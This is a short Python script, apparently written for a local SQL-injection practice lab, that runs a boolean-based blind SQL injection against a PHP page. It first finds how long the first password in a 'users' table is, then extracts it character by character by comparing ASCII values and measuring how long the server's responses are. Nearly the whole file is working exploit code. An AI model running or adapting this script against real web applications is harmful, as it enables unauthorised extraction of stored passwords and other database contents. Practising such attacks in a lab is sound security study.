import requests
# 基于布尔的盲注
#共5行
#查看users表的第四列 password的具体信息
#第一行密码32

base_url = 'http://192.168.254.147/SQL_injection/low.php? %s &Submit_ID=确认'

def get_table_column_data(length:int):
    data = ""
    content_template = "id=1 and ASCII(SUBSTR(" \
                       "(SELECT password FROM users LIMIT 0,1)," \
                       "%d,1))=%d"
    chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!@#$%^&*()_-+={[}]|\\:;\"\'<,>.?\/'

    for i in range(1, length + 1):
        for char in chars:
            content = content_template % (i, ord(char))
            url = base_url % content
            # print(url)

            response = requests.get(url)
            resLen = len(response.text)
            # 根据返回长度的不同来判断字符正确与否
            # print(length)
            if resLen > 400:
                data += char
                break
    print(data)

def get_table_column_data_length():
    length = 0
    content_template = "id=1 AND (select length(password) from users limit 0,1)=%d"

    for i in range(1, 64):
        content = content_template % i
        url = base_url % content
        # print (url)
        response = requests.get(url)
        resLen = len(response.text)
        # print(resLen)
        if resLen > 400:
            length = i
            break;

    return length

if __name__ == '__main__':
    length = get_table_column_data_length()
    get_table_column_data(length)